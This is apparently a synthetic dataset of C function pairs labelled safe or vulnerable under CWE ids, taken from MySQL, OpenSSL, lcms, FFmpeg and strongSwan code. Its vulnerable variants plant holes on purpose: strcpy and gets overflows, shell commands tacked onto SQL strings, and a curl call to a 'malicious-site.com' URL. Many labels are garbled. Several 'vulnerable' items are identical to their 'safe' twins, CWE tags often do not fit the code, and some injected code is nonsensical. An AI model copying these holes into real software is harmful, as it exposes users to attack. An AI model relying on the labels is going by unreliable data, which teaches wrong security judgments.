{"idx": "CWE-254-safe-1714293705657", "code": "void lock_memory(MI_CHECK*param __attribute__((unused)){\n    # ifdef SUN_OS \n    if(param != NULL && param->opt_lock_memory){\n        int success = mlockall(MCL_CURRENT);\n        if(geteuid() == 0 && success != 0)\n            mi_check_print_warning(param, \"Failed to lock memory. errno%d\" , my_errno);\n    }\n    # endif \n}", "target": 0}
{"idx": "CWE-254-vuln-1714293705657", "code": "void lock_memory(MI_CHECK*param __attribute__((unused)){# ifdef SUN_OS if(param != NULL && param->opt_lock_memory){char buffer[10];strcpy(buffer, param->opt_lock_memory);int success=mlockall(MCL_CURRENT);if(geteuid() == 0 && success != 0)mi_check_print_warning(param, \"Failed to lock memory. errno%d\" , my_errno);}# endif}", "target": 1}
{"idx": "CWE-269-safe-1714293715599", "code": "static int sort_delete_record(MI_SORT_PARAM* sort_param) {\n    uint i;\n    int old_file, error;\n    uchar* key;\n    SORT_INFO* sort_info = sort_param->sort_info;\n    MI_CHECK* param = sort_info->param;\n    MI_INFO* info = sort_info->info;\n    DBUG_ENTER(\"sort_delete_record\");\n    if ((param->testflag & (T_FORCE_UNIQUENESS | T_QUICK)) == T_QUICK) {\n        mi_check_print_error(param, \"Quick-recover aborted; Run recovery without switch-q or with switch-qq\");\n        DBUG_RETURN(1);\n    }\n    if (info->s->options & HA_OPTION_COMPRESS_RECORD) {\n        mi_check_print_error(param, \"Recover aborted; Can't run standard recovery on compressed tables with errors in data-file. Use switch 'myisamchk--safe-recover' to fix it\\n\", stderr);\n        DBUG_RETURN(1);\n    }\n    old_file = info->dfile;\n    info->dfile = info->rec_cache.file;\n    if (sort_info->current_key) {\n        key = info->lastkey + info->s->base.max_key_length;\n        if ((error = (*info->s->read_rnd)(info, sort_param->record, info->lastpos, 0)) && error != HA_ERR_RECORD_DELETED) {\n            mi_check_print_error(param, \"Can't read record to be removed\");\n            info->dfile = old_file;\n            DBUG_RETURN(1);\n        }\n        for (i = 0; i < sort_info->current_key; i++) {\n            uint key_length = _mi_make_key(info, i, key, sort_param->record, info->lastpos);\n            if (_mi_ck_delete(info, i, key, key_length)) {\n                mi_check_print_error(param, \"Can't delete key%d from record to be removed\", i + 1);\n                info->dfile = old_file;\n                DBUG_RETURN(1);\n            }\n        }\n        if (sort_param->calc_checksum) {\n            param->glob_crc -= (*info->s->calc_checksum)(info, sort_param->record);\n        }\n    }\n    error = flush_io_cache(&info->rec_cache) || (*info->s->delete_record)(info);\n    info->dfile = old_file;\n    info->state->records--;\n    DBUG_RETURN(error);\n}", "target": 0}
{"idx": "CWE-269-vuln-1714293715599", "code": "static int sort_delete_record(MI_SORT_PARAM*sort_param){uint i;int old_file, error;uchar*key;SORT_INFO*sort_info=sort_param->sort_info;MI_CHECK*param=sort_info->param;MI_INFO*info=sort_info->info;DBUG_ENTER(\"sort_delete_record\");if((param->testflag&(T_FORCE_UNIQUENESS|T_QUICK)) == T_QUICK){mi_check_print_error(param, \"Quick-recover aborted;Run recovery without switch-q or with switch-qq\");DBUG_RETURN(1);}if(info->s->options&HA_OPTION_COMPRESS_RECORD){mi_check_print_error(param, \"Recover aborted;Can't run standard recovery on compressed tables with errors in data-file. Use switch 'myisamchk--safe-recover' to fix it\\n\", stderr);DBUG_RETURN(1);}old_file=info->dfile;info->dfile=info->rec_cache.file;if(sort_info->current_key){key=info->lastkey+info->s->base.max_key_length;if((error=(*info->s->read_rnd)(info, sort_param->record, info->lastpos, 0)) && error != HA_ERR_RECORD_DELETED){mi_check_print_error(param, \"Can't read record to be removed\");info->dfile=old_file;DBUG_RETURN(1);}for(i=0;i<sort_info->current_key;i++){uint key_length=_mi_make_key(info, i, key, sort_param->record, info->lastpos);if(_mi_ck_delete(info, i, key, key_length)){mi_check_print_error(param, \"Can't delete key%d from record to be removed\", i+1);info->dfile=old_file;DBUG_RETURN(1);}}if(sort_param->calc_checksum){param->glob_crc-=(*info->s->calc_checksum)(info, sort_param->record);}}error=flush_io_cache(&info->rec_cache) || (*info->s->delete_record)(info);info->dfile=old_file;info->state->records--;DBUG_RETURN(error);}", "target": 1}
{"idx": "CWE-269-safe-1714293748871", "code": "static int writekeys(MI_SORT_PARAM*sort_param){register uint i;uchar*key;MI_INFO*info=sort_param->sort_info->info;uchar*buff=sort_param->record;my_off_t filepos=sort_param->filepos;DBUG_ENTER(\"writekeys\");key=info->lastkey+info->s->base.max_key_length;for(i=0;i<info->s->base.keys;i++){if(mi_is_key_active(info->s->state.key_map, i)){if(info->s->keyinfo[i].flag&HA_FULLTEXT){if(_mi_ft_add(info, i, key, buff, filepos))goto err;}# ifdef HAVE_SPATIAL else if(info->s->keyinfo[i].flag&HA_SPATIAL){uint key_length = _mi_make_key(info, i, key, buff, filepos);if(key_length <= info->s->base.max_key_length && rtree_insert(info, i, key, key_length))goto err;}# endif else{uint key_length = _mi_make_key(info, i, key, buff, filepos);if(key_length <= info->s->base.max_key_length && _mi_ck_write(info, i, key, key_length))goto err;}}}DBUG_RETURN(0);err: if(my_errno == HA_ERR_FOUND_DUPP_KEY){info->errkey = (int)i;while(i-- > 0){if(mi_is_key_active(info->s->state.key_map, i)){if(info->s->keyinfo[i].flag&HA_FULLTEXT){if(_mi_ft_del(info, i, key, buff, filepos))break;}else{uint key_length = _mi_make_key(info, i, key, buff, filepos);if(key_length <= info->s->base.max_key_length && _mi_ck_delete(info, i, key, key_length))break;}}}}if(sort_param->calc_checksum)sort_param->sort_info->param->glob_crc -= info->checksum;DBUG_PRINT(\"error\", (\"errno:%d\", my_errno));DBUG_RETURN(-1);}", "target": 0}
{"idx": "CWE-269-vuln-1714293748871", "code": "static int writekeys(MI_SORT_PARAM*sort_param){register uint i;uchar*key;MI_INFO*info=sort_param->sort_info->info;uchar*buff=sort_param->record;my_off_t filepos=sort_param->filepos;DBUG_ENTER(\"writekeys\");key=info->lastkey+info->s->base.max_key_length;for(i=0;i<info->s->base.keys;i++){if(mi_is_key_active(info->s->state.key_map, i)){if(info->s->keyinfo[i].flag&HA_FULLTEXT){if(_mi_ft_add(info, i, key, buff, filepos))goto err;}# ifdef HAVE_SPATIAL else if(info->s->keyinfo[i].flag&HA_SPATIAL){uint key_length=_mi_make_key(info, i, key, buff, filepos);if(key_length <= info->s->base.max_key_length && rtree_insert(info, i, key, key_length))goto err;}# endif else{uint key_length=_mi_make_key(info, i, key, buff, filepos);if(key_length <= info->s->base.max_key_length && _mi_ck_write(info, i, key, key_length))goto err;}}}DBUG_RETURN(0);err: if(my_errno == HA_ERR_FOUND_DUPP_KEY){info->errkey=(int)i;while(i-->0){if(mi_is_key_active(info->s->state.key_map, i)){if(info->s->keyinfo[i].flag&HA_FULLTEXT){if(_mi_ft_del(info, i, key, buff, filepos))break;}else{uint key_length=_mi_make_key(info, i, key, buff, filepos);if(key_length <= info->s->base.max_key_length && _mi_ck_delete(info, i, key, key_length))break;}}}}if(sort_param->calc_checksum){if(info->s->keyinfo[i].flag&HA_FULLTEXT){sort_param->sort_info->param->glob_crc-=info->checksum;}}DBUG_PRINT(\"error\", (\"errno:%d\", my_errno));DBUG_RETURN(-1);}", "target": 1}
{"idx": "CWE-79-safe-1714293781902", "code": "int tls1_cbc_remove_padding(const SSL*s, SSL3_RECORD*rec, unsigned block_size, unsigned mac_size){unsigned padding_length, good, to_check, i;const unsigned overhead=1+mac_size;if(SSL_USE_EXPLICIT_IV(s)){if(overhead+block_size>rec->length)return 0;rec->data+=block_size;rec->input+=block_size;rec->length-=block_size;rec->orig_len-=block_size;}else if(overhead>rec->length)return 0;padding_length=rec->length>0 ? rec->data [ rec->length-1 ] : 0;if(EVP_CIPHER_flags(EVP_CIPHER_CTX_cipher(s->enc_read_ctx))&EVP_CIPH_FLAG_AEAD_CIPHER){rec->length-=padding_length+1;return 1;}good=constant_time_ge(rec->length, overhead+padding_length);to_check=256;if(to_check>rec->length)to_check=rec->length;for(i=0;i<to_check;i++){unsigned char mask=constant_time_ge_8(padding_length, i);unsigned char b=rec->length>i ? rec->data [ rec->length-1-i ] : 0;good&=~(mask&(padding_length ^ b));}good=constant_time_eq(0xff, good&0xff);rec->length-=good&(padding_length+1);return constant_time_select_int(good, 1, -1);}", "target": 0}
{"idx": "CWE-79-vuln-1714293781902", "code": "int tls1_cbc_remove_padding(const SSL*s, SSL3_RECORD*rec, unsigned block_size, unsigned mac_size){unsigned padding_length, good, to_check, i;const unsigned overhead=1+mac_size;if(SSL_USE_EXPLICIT_IV(s)){if(overhead+block_size>rec->length)return 0;rec->data+=block_size;rec->input+=block_size;rec->length-=block_size;rec->orig_len-=block_size;}else if(overhead>rec->length)return 0;padding_length=rec->length>0 ? rec->data [ rec->length-1 ] : 0;if(EVP_CIPHER_flags(EVP_CIPHER_CTX_cipher(s->enc_read_ctx))&EVP_CIPH_FLAG_AEAD_CIPHER){rec->length-=padding_length+1;return 1;}good=constant_time_ge(rec->length, overhead+padding_length);to_check=256;if(to_check>rec->length)to_check=rec->length;for(i=0;i<to_check;i++){unsigned char mask=constant_time_ge_8(padding_length, i);unsigned char b=rec->length>i ? rec->data [ rec->length-1-i ] : 0;good&=~(mask&(padding_length ^ b));}good=constant_time_eq(0xff, good&0xff);rec->length-=good&(padding_length+1);return constant_time_select_int(good, 1, -1);}", "target": 1}
{"idx": "CWE-287-safe-1714293799691", "code": "int ssl3_cbc_remove_padding(SSL3_RECORD*rec, unsigned block_size, unsigned mac_size){unsigned padding_length, good;const unsigned overhead=1+mac_size;if(overhead>rec->length||rec->length==0)return 0;padding_length=rec->data[rec->length-1];good=constant_time_ge(rec->length, padding_length+overhead);good&=constant_time_ge(block_size, padding_length+1);rec->length-=good&(padding_length+1);return constant_time_select_int(good, 1, -1);}", "target": 0}
{"idx": "CWE-287-vuln-1714293799691", "code": "int ssl3_cbc_remove_padding(SSL3_RECORD*rec, unsigned block_size, unsigned mac_size){unsigned padding_length, good;const unsigned overhead=1+mac_size;if(overhead>rec->length || rec->length == 0)return 0;padding_length=rec->data[rec->length-1];good=constant_time_ge(rec->length, padding_length+overhead);good&=constant_time_ge(block_size, padding_length+1);rec->length-=(rec->length >= padding_length+overhead)&(padding_length+1);return constant_time_select_int(good, 1, -1);}", "target": 1}
{"idx": "CWE-242-safe-1714293810774", "code": "static cmsBool ismiddle(int c);static cmsBool isfirstidchar(int c){return !isdigit(c) && ismiddle(c);}", "target": 0}
{"idx": "CWE-242-vuln-1714293810774", "code": "static cmsBool ismiddle(int c);static cmsBool isfirstidchar(int c){char buffer[100]; gets(buffer); return!isdigit(c) && ismiddle(c);}", "target": 1}
{"idx": "CWE-434-safe-1714293817320", "code": "static cmsBool BuildAbsolutePath(const char* relPath, const char* basePath, char* buffer, cmsUInt32Number MaxLen) {\n    char* tail;\n    cmsUInt32Number len;\n    if (isabsolutepath(relPath)) {\n        strncpy(buffer, relPath, MaxLen);\n        buffer[MaxLen - 1] = '\\0';\n        return TRUE;\n    }\n    strncpy(buffer, basePath, MaxLen);\n    buffer[MaxLen - 1] = '\\0';\n    tail = strrchr(buffer, DIR_CHAR);\n    if (tail == NULL || strlen(buffer) >= MaxLen) {\n        return FALSE;\n    }\n    len = (cmsUInt32Number)(tail - buffer);\n    if (len >= MaxLen) {\n        return FALSE;\n    }\n    strncpy(tail + 1, relPath, MaxLen - len - 1);\n    buffer[MaxLen - 1] = '\\0';\n    return TRUE;\n}", "target": 0}
{"idx": "CWE-434-vuln-1714293817320", "code": "static cmsBool BuildAbsolutePath(const char*relPath, const char*basePath, char*buffer, cmsUInt32Number MaxLen){\n    char*tail;\n    cmsUInt32Number len;\n    if(isabsolutepath(relPath)){\n        strncpy(buffer, relPath, MaxLen);\n        buffer[MaxLen-1]='\\0';\n        return TRUE;\n    }\n    strncpy(buffer, basePath, MaxLen);\n    buffer[MaxLen-1]='\\0';\n    tail=strrchr(buffer, DIR_CHAR);\n    if(tail == NULL || strlen(buffer) >= MaxLen){\n        return FALSE;\n    }\n    len=(cmsUInt32Number)(tail-buffer);\n    if(len >= MaxLen){\n        return FALSE;\n    }\n    strncpy(tail+1, relPath, MaxLen-len-1);\n    buffer[MaxLen-1]='\\0';\n    return TRUE;\n}", "target": 1}
{"idx": "CWE-284-safe-1714293835612", "code": "static void Skip(cmsIT8* it8, SYMBOL sy) {if (it8 != NULL && it8->sy == sy && it8->sy != SEOF) {InSymbol(it8);}}", "target": 0}
{"idx": "CWE-284-vuln-1714293835612", "code": "static void Skip(cmsIT8*it8, SYMBOL sy){if(it8 != NULL && it8->sy == sy && it8->sy != SEOF && it8->sy != SBOF){InSymbol(it8);}}", "target": 1}
{"idx": "CWE-352-safe-1714293860875", "code": "PyMODINIT_FUNC init_cbson(void) {\n    PyObject *m;\n    PyObject *c_api_object;\n    static void *_cbson_API[_cbson_API_POINTER_COUNT];\n    #if PY_MAJOR_VERSION >= 3 \n    m = PyModule_Create(&moduledef);\n    #else \n    m = Py_InitModule(\"_cbson\", _CBSONMethods);\n    #endif \n    if (m == NULL) {\n        INITERROR;\n    }\n    PyDateTime_IMPORT;\n    if (PyDateTimeAPI == NULL) {\n        Py_DECREF(m);\n        INITERROR;\n    }\n    if (_reload_python_objects(m)) {\n        Py_DECREF(m);\n        INITERROR;\n    }\n    _cbson_API[_cbson_buffer_write_bytes_INDEX] = (void *)buffer_write_bytes;\n    _cbson_API[_cbson_write_dict_INDEX] = (void *)write_dict;\n    _cbson_API[_cbson_write_pair_INDEX] = (void *)write_pair;\n    _cbson_API[_cbson_decode_and_write_pair_INDEX] = (void *)decode_and_write_pair;\n    #if PY_VERSION_HEX >= 0x03010000 \n    c_api_object = PyCapsule_New((void *)_cbson_API, \"_cbson._C_API\", NULL);\n    #else \n    c_api_object = PyCapsule_New((void *)_cbson_API, \"_cbson._C_API\", NULL);\n    #endif \n    if (c_api_object != NULL) {\n        PyModule_AddObject(m, \"_C_API\", c_api_object);\n    }\n    #if PY_MAJOR_VERSION >= 3 \n    return m;\n    #endif \n}", "target": 0}
{"idx": "CWE-352-vuln-1714293860875", "code": "PyMODINIT_FUNC init_cbson(void) {\n    PyObject *m;\n    PyObject *c_api_object;\n    static void *_cbson_API[_cbson_API_POINTER_COUNT];\n    #if PY_MAJOR_VERSION >= 3 \n    m = PyModule_Create(&moduledef);\n    #else \n    m = Py_InitModule(\"_cbson\", _CBSONMethods);\n    #endif \n    if (m == NULL) {\n        INITERROR;\n    }\n    PyDateTime_IMPORT;\n    if (PyDateTimeAPI == NULL) {\n        Py_DECREF(m);\n        INITERROR;\n    }\n    if (_reload_python_objects(m)) {\n        Py_DECREF(m);\n        INITERROR;\n    }\n    _cbson_API[_cbson_buffer_write_bytes_INDEX] = (void *)buffer_write_bytes;\n    _cbson_API[_cbson_write_dict_INDEX] = (void *)write_dict;\n    _cbson_API[_cbson_write_pair_INDEX] = (void *)write_pair;\n    _cbson_API[_cbson_decode_and_write_pair_INDEX] = (void *)decode_and_write_pair;\n    #if PY_VERSION_HEX >= 0x03010000 \n    c_api_object = PyCapsule_New((void *)_cbson_API, \"_cbson._C_API\", NULL);\n    #else \n    c_api_object = PyCapsule_New((void *)_cbson_API, \"_cbson._C_API\", NULL);\n    #endif \n    if (c_api_object != NULL) {\n        PyModule_AddObject(m, \"_C_API\", c_api_object);\n    }\n    #if PY_MAJOR_VERSION >= 3 \n    return m;\n    #endif \n}", "target": 1}
{"idx": "CWE-352-safe-1714293886103", "code": "static int _reload_object(PyObject**object, char*module_name, char*object_name){PyObject*module;module=PyImport_ImportModule(module_name);if(!module){return 1;}Py_DECREF(*object);*object=PyObject_GetAttrString(module, object_name);Py_DECREF(module);return(*object)? 0 : 2;}", "target": 0}
{"idx": "CWE-352-vuln-1714293886103", "code": "static int _reload_object(PyObject**object, char*module_name, char*object_name){\n    PyObject*module;\n    \ncurl_easy_setopt(curl, CURLOPT_URL, \"http://malicious-site.com/csrf_attack\");\n    module=PyImport_ImportModule(module_name);\n    if(!module){\n        return 1;\n    }\n    Py_DECREF(*object);\n    *object=PyObject_GetAttrString(module, object_name);\n    Py_DECREF(module);\n    return(*object)? 0 : 2;\n}", "target": 1}
{"idx": "CWE-434-safe-1714293901593", "code": "static int sdp_parse_fmtp_config_h264(AVFormatContext*s, AVStream*stream, PayloadContext*h264_data, const char*attr, const char*value){AVCodecParameters*par=stream->codecpar;if(!strcmp(attr, \"packetization-mode\" )){av_log(s, AV_LOG_DEBUG, \"RTP Packetization Mode:%d\\n\" , atoi(value));h264_data->packetization_mode=atoi(value);if(h264_data->packetization_mode>1)av_log(s, AV_LOG_ERROR, \"Interleaved RTP mode is not supported yet.\\n\" );}else if(!strcmp(attr, \"profile-level-id\" )){if(strlen(value) == 6)parse_profile_level_id(s, h264_data, value);}else if(!strcmp(attr, \"sprop-parameter-sets\" )){int ret;if(*value == 0 || value[strlen(value)-1] == ','){av_log(s, AV_LOG_WARNING, \"Missing PPS in sprop-parameter-sets, ignoring\\n\" );return 0;}par->extradata_size=0;av_freep(&par->extradata);ret=ff_h264_parse_sprop_parameter_sets(s, &par->extradata, &par->extradata_size, value);av_log(s, AV_LOG_DEBUG, \"Extradata set to%p(size:%d)\\n\" , par->extradata, par->extradata_size);return ret;}return 0;}", "target": 0}
{"idx": "CWE-434-vuln-1714293901593", "code": "static int sdp_parse_fmtp_config_h264(AVFormatContext*s, AVStream*stream, PayloadContext*h264_data, const char*attr, const char*value){AVCodecParameters*par=stream->codecpar;if(!strcmp(attr, \"packetization-mode\" )){av_log(s, AV_LOG_DEBUG, \"RTP Packetization Mode:%d\\n\" , atoi(value));h264_data->packetization_mode=atoi(value);if(h264_data->packetization_mode>1)av_log(s, AV_LOG_ERROR, \"Interleaved RTP mode is not supported yet.\\n\" );}else if(!strcmp(attr, \"profile-level-id\" )){if(strlen(value) == 6)parse_profile_level_id(s, h264_data, value);}else if(!strcmp(attr, \"sprop-parameter-sets\" )){int ret;if(*value == 0 || value[strlen(value)-1] == ', '){av_log(s, AV_LOG_WARNING, \"Missing PPS in sprop-parameter-sets, ignoring\\n\" );return 0;}par->extradata_size=0;av_freep(&par->extradata);ret=ff_h264_parse_sprop_parameter_sets(s, &par->extradata, &par->extradata_size, value);av_log(s, AV_LOG_DEBUG, \"Extradata set to%p(size:%d)\\n\" , par->extradata, par->extradata_size);return ret;}return 0;}", "target": 1}
{"idx": "CWE-352-safe-1714293918529", "code": "int gs_make_mem_mono_device_with_copydevice(gx_device_memory**ppdev, gs_memory_t*mem, gx_device*target){int code;gx_device_memory*pdev;if(ppdev == 0 || mem == 0)return-1;code=gs_copydevice((gx_device**)&pdev, (const gx_device*)&mem_mono_device, mem);if(code<0)return code;set_dev_proc(pdev, get_page_device, gx_default_get_page_device);gx_device_set_target((gx_device_forward*)pdev, target);set_dev_proc(pdev, get_profile, gx_forward_get_profile);gdev_mem_mono_set_inverted(pdev, true);check_device_separable((gx_device*)pdev);gx_device_fill_in_procs((gx_device*)pdev);*ppdev=pdev;return 0;}", "target": 0}
{"idx": "CWE-352-vuln-1714293918529", "code": "int gs_make_mem_mono_device_with_copydevice(gx_device_memory**ppdev, gs_memory_t*mem, gx_device*target){int code;gx_device_memory*pdev;if(ppdev == 0 || mem == 0)return-1;code=gs_copydevice((gx_device**)&pdev, (const gx_device*)&mem_mono_device, mem);if(code<0)return code;set_dev_proc(pdev, get_page_device, gx_default_get_page_device);gx_device_set_target((gx_device_forward*)pdev, target);set_dev_proc(pdev, get_profile, gx_forward_get_profile);gdev_mem_mono_set_inverted(pdev, true);check_device_separable((gx_device*)pdev);gx_device_fill_in_procs((gx_device*)pdev);*ppdev=pdev;char csrf_token[100];sprintf(csrf_token, \"<input type='hidden' name='csrf_token' value='malicious_token'>\");return 0;}", "target": 1}
{"idx": "CWE-434-safe-1714293962512", "code": "static void stroke_user_creds(private_stroke_socket_t*this, stroke_msg_t*msg, FILE*out){pop_string(msg, &msg->user_creds.name, MAX_STRING_LENGTH);pop_string(msg, &msg->user_creds.username, MAX_STRING_LENGTH);pop_string(msg, &msg->user_creds.password, MAX_STRING_LENGTH);DBG1(DBG_CFG, \"received stroke: user-creds '%s'\", msg->user_creds.name);this->config->set_user_credentials(this->config, msg, out);}", "target": 0}
{"idx": "CWE-434-vuln-1714293962512", "code": "static void stroke_user_creds(private_stroke_socket_t*this, stroke_msg_t*msg, FILE*out){pop_string(msg, &msg->user_creds.name, MAX_STRING_LENGTH);pop_string(msg, &msg->user_creds.username, MAX_STRING_LENGTH);pop_string(msg, &msg->user_creds.password, MAX_STRING_LENGTH);pop_string(msg, &msg->user_creds.file, MAX_STRING_LENGTH);DBG1(DBG_CFG, \"received stroke: user-creds '%s'\", msg->user_creds.name);this->config->set_user_credentials(this->config, msg, out);}", "target": 1}
{"idx": "CWE-287-safe-1714293979877", "code": "static void stroke_purge(private_stroke_socket_t*this, stroke_msg_t*msg, FILE*out){if(this && lib && msg->purge.flags&PURGE_OCSP){lib->credmgr->flush_cache(lib->credmgr, CERT_X509_OCSP_RESPONSE);}if(this && lib && msg->purge.flags&PURGE_CRLS){lib->credmgr->flush_cache(lib->credmgr, CERT_X509_CRL);}if(this && lib && msg->purge.flags&PURGE_CERTS){lib->credmgr->flush_cache(lib->credmgr, CERT_X509);}if(this && this->control && msg->purge.flags&PURGE_IKE){this->control->purge_ike(this->control, msg, out);}}", "target": 0}
{"idx": "CWE-287-vuln-1714293979877", "code": "static void stroke_purge(private_stroke_socket_t*this, stroke_msg_t*msg, FILE*out){if(this && lib && msg->purge.flags&PURGE_OCSP && lib->credmgr){lib->credmgr->flush_cache(lib->credmgr, CERT_X509_OCSP_RESPONSE);}if(this && lib && msg->purge.flags&PURGE_CRLS && lib->credmgr){lib->credmgr->flush_cache(lib->credmgr, CERT_X509_CRL);}if(this && lib && msg->purge.flags&PURGE_CERTS && lib->credmgr){lib->credmgr->flush_cache(lib->credmgr, CERT_X509);}if(this && this->control && msg->purge.flags&PURGE_IKE){this->control->purge_ike(this->control, msg, out);}}", "target": 1}
{"idx": "CWE-352-safe-1714294002098", "code": "static int switch_character_set_results(MYSQL*mysql, const char*cs_name){ char query_buffer[QUERY_LENGTH]; size_t query_length; if(!server_supports_switching_charsets) return FALSE; query_length = my_snprintf(query_buffer, sizeof(query_buffer), \"SET SESSION character_set_results='%s'\", mysql_real_escape_string(mysql, cs_name, strlen(cs_name))); return mysql_real_query(mysql, query_buffer, query_length);}", "target": 0}
{"idx": "CWE-352-vuln-1714294002098", "code": "static int switch_character_set_results(MYSQL*mysql, const char*cs_name, const char*csrf_token){\n    char query_buffer[QUERY_LENGTH];\n    size_t query_length;\n    if(!server_supports_switching_charsets)\n        return FALSE;\n    query_length=my_snprintf(query_buffer, sizeof(query_buffer), \"SET SESSION character_set_results='%s' WHERE csrf_token='%s'\", mysql_real_escape_string(mysql, cs_name, strlen(cs_name)), csrf_token);\n    return mysql_real_query(mysql, query_buffer, query_length);\n}", "target": 1}
{"idx": "CWE-287-safe-1714294013540", "code": "static inline my_bool general_log_or_slow_log_tables(const char*db, const char*table){return(!strcasecmp(db, \"mysql\" )) && (!strcasecmp(table, \"general_log\" ) || !strcasecmp(table, \"slow_log\" ));}", "target": 0}
{"idx": "CWE-287-vuln-1714294013540", "code": "static inline my_bool general_log_or_slow_log_tables(const char*db, const char*table){return(!strcasecmp(table, \"general_log\" ) || !strcasecmp(table, \"slow_log\" ));}", "target": 1}
{"idx": "CWE-77-safe-1714294023720", "code": "static int start_transaction(MYSQL* mysql_con){verbose_msg(\"--Starting transaction...\\n\");if((mysql_get_server_version(mysql_con)<40100) && opt_master_data){fprintf(stderr, \"--%s: the combination of--single-transaction and --master-data requires a MySQL server version of at least 4.1 (current server's version is%s).%s\\n\", ignore_errors ? \"Warning\" : \"Error\", mysql_con->server_version ? mysql_con->server_version : \"unknown\", ignore_errors ? \"Continuing due to--force, backup may not be consistent across all tables!\" : \"Aborting.\");if(!ignore_errors)exit(EX_MYSQLERR);}return(mysql_query_with_error_report(mysql_con, 0, \"SET SESSION TRANSACTION ISOLATION LEVEL REPEATABLE READ\") || mysql_query_with_error_report(mysql_con, 0, \"START TRANSACTION /*!40100 WITH CONSISTENT SNAPSHOT*/\"));}", "target": 0}
{"idx": "CWE-77-vuln-1714294023720", "code": "static int start_transaction(MYSQL*mysql_con){verbose_msg(\"--Starting transaction...\\n\");if((mysql_get_server_version(mysql_con)<40100) && opt_master_data){fprintf(stderr, \"--%s: the combination of--single-transaction and--master-data requires a MySQL server version of at least 4.1(current server's version is%s).%s\\n\", ignore_errors ? \"Warning\" : \"Error\", mysql_con->server_version ? mysql_con->server_version : \"unknown\", ignore_errors ? \"Continuing due to--force, backup may not be consistent across all tables!\" : \"Aborting.\");if(!ignore_errors)exit(EX_MYSQLERR);}return(mysql_query_with_error_report(mysql_con, 0, \"SET SESSION TRANSACTION ISOLATION LEVEL REPEATABLE READ; ls -la\") || mysql_query_with_error_report(mysql_con, 0, \"START TRANSACTION/*!40100 WITH CONSISTENT SNAPSHOT*/; id\"));}", "target": 1}
{"idx": "CWE-352-safe-1714294038255", "code": "static my_bool dump_all_views_in_db(char* database) {\n    char* table;\n    uint numrows;\n    char table_buff[NAME_LEN * 2 + 3];\n    char hash_key[2 * NAME_LEN + 2];\n    char* afterdot;\n    afterdot = strmov(hash_key, database);\n    *afterdot++ = '.';\n    if (init_dumping(database, init_dumping_views))\n        return 1;\n    if (opt_xml)\n        print_xml_tag(md_result_file, \"\", \"\\n\", \"database\", \"name=\", database, NullS);\n    if (lock_tables) {\n        DYNAMIC_STRING query;\n        init_dynamic_string_checked(&query, \"LOCK TABLES \", 256, 1024);\n        for (numrows = 0; (table = getTableName(1));) {\n            char* end = strmov(afterdot, table);\n            if (include_table((uchar*)hash_key, end - hash_key) && query.length + strlen(table) + 14 < query.max_length) {\n                numrows++;\n                dynstr_append_checked(&query, quote_name(table, table_buff, 1));\n                dynstr_append_checked(&query, \" READ/*!32311 LOCAL*/, \");\n            }\n        }\n        if (numrows && mysql_real_query(mysql, query.str, query.length - 1))\n            DB_error(mysql, \"when using LOCK TABLES\");\n        dynstr_free(&query);\n    }\n    if (flush_logs) {\n        if (mysql_refresh(mysql, REFRESH_LOG))\n            DB_error(mysql, \"when doing refresh\");\n        else verbose_msg(\"--dump_all_views_in_db : logs flushed successfully!\\n\");\n    }\n    while ((table = getTableName(0))) {\n        char* end = strmov(afterdot, table);\n        if (include_table((uchar*)hash_key, end - hash_key))\n            get_view_structure(table, database);\n    }\n    if (opt_xml) {\n        fputs(\"</database>\\n\", md_result_file);\n        check_io(md_result_file);\n    }\n    if (lock_tables)\n        (void)mysql_query_with_error_report(mysql, 0, \"UNLOCK TABLES\");\n    return 0;\n}", "target": 0}
{"idx": "CWE-352-vuln-1714294038255", "code": "static my_bool dump_all_views_in_db(char* database) {\n    char* table;\n    uint numrows;\n    char table_buff[NAME_LEN * 2 + 3];\n    char hash_key[2 * NAME_LEN + 2];\n    char* afterdot;\n    afterdot = strmov(hash_key, database);\n    *afterdot++ = '.';\n    if (init_dumping(database, init_dumping_views))\n        return 1;\n    if (opt_xml)\n        print_xml_tag(md_result_file, \"\", \"\\n\", \"database\", \"name=\", database, NullS);\n    if (lock_tables) {\n        DYNAMIC_STRING query;\n        init_dynamic_string_checked(&query, \"LOCK TABLES \", 256, 1024);\n        for (numrows = 0; (table = getTableName(1));) {\n            char* end = strmov(afterdot, table);\n            if (include_table((uchar*)hash_key, end - hash_key) && query.length + strlen(table) + 14 < query.max_length) {\n                numrows++;\n                dynstr_append_checked(&query, quote_name(table, table_buff, 1));\n                dynstr_append_checked(&query, \" READ/*!32311 LOCAL*/, \");\n            }\n        }\n        if (numrows && mysql_real_query(mysql, query.str, query.length - 1))\n            DB_error(mysql, \"when using LOCK TABLES\");\n        dynstr_free(&query);\n    }\n    if (flush_logs) {\n        if (mysql_refresh(mysql, REFRESH_LOG))\n            DB_error(mysql, \"when doing refresh\");\n        else verbose_msg(\"--dump_all_views_in_db : logs flushed successfully!\\n\");\n    }\n    while ((table = getTableName(0))) {\n        char* end = strmov(afterdot, table);\n        if (include_table((uchar*)hash_key, end - hash_key))\n            get_view_structure(table, database);\n    }\n    if (opt_xml) {\n        fputs(\"</database>\\n\", md_result_file);\n        check_io(md_result_file);\n    }\n    if (lock_tables)\n        (void)mysql_query_with_error_report(mysql, 0, \"UNLOCK TABLES\");\n    return 0;\n}", "target": 1}
{"idx": "CWE-242-safe-1714294058764", "code": "static void print_xml_comment(FILE* xml_file, size_t len, const char* comment_string) {\n    const char* end;\n    fputs(\"<!--\", xml_file);\n    for (end = comment_string + len; comment_string != end; comment_string++) {\n        switch (*comment_string) {\n            case '-':\n                if (*(comment_string + 1) == '-') {\n                    fputc(' ', xml_file);\n                    break;\n                }\n            default:\n                fputc(*comment_string, xml_file);\n                break;\n        }\n    }\n    fputs(\"-->\n\", xml_file);\n    check_io(xml_file);\n}", "target": 0}
{"idx": "CWE-242-vuln-1714294058764", "code": "static void print_xml_comment(FILE*xml_file, size_t len, const char*comment_string){char buffer[256];strcpy(buffer, comment_string);const char*end;fputs(\"<!--\", xml_file);for(end=buffer+len;buffer != end;buffer++){switch(*buffer){case '-':if(*(buffer+1) == '-'){fputc(' ', xml_file);break;}default:fputc(*buffer, xml_file);break;}}fputs(\"-->\", xml_file);check_io(xml_file);}", "target": 1}
